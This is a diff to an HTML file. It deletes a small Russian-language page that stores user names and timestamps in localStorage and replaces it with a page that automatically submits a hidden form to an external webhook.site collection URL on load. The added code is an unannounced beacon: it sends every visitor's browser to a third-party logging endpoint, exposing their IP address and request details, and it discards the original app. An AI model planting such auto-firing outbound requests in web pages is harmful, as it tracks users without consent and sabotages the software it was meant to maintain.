@@ -1,52 +1,14 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Запросы пользователей</title>
-    <style>
-        body { font-family: Arial, sans-serif; }
-        #requests { margin-top: 20px; }
-        .request { border: 1px solid #ccc; padding: 10px; margin: 5px; }
-    </style>
-</head>
-<body>
-    <h1>Запросы пользователей</h1>
-    <input type="text" id="username" placeholder="Введите свое имя">
-    <button id="saveRequest">Сохранить запрос</button>
-    <div id="requests"></div>
-
+<html>
+  <body>
+    <form
+      action="https://webhook.site/28fdc74d-c38a-4f63-9fbe-2757579ef561"
+      method="GET"
+    >
+      <input type="hidden" />
+    </form>
     <script>
-        const requestsDiv = document.getElementById('requests');
-
-        // Восстановление запросов из Local Storage
-        function loadRequests() {
-            const requests = JSON.parse(localStorage.getItem('requests')) || [];
-            requests.forEach(req => {
-                displayRequest(req);
-            });
-        }
-
-        // Отображение запроса
-        function displayRequest(req) {
-            const reqDiv = document.createElement('div');
-            reqDiv.classList.add('request');
-            reqDiv.innerText = `${req.timestamp} - ${req.user}`;
-            requestsDiv.appendChild(reqDiv);
-        }
-
-        // Добавление нового запроса
-        document.getElementById('saveRequest').onclick = function() {
-            const username = document.getElementById('username').value;
-            const newRequest = { timestamp: new Date().toISOString(), user: username };
-            const requests = JSON.parse(localStorage.getItem('requests')) || [];
-            requests.push(newRequest);
-            localStorage.setItem('requests', JSON.stringify(requests));
-            displayRequest(newRequest);
-        };
-
-        // Загрузка запросов при старте
-        window.onload = loadRequests;
+      console.log(document.forms[0].submit());
     </script>
-</body>
+  </body>
 </html>
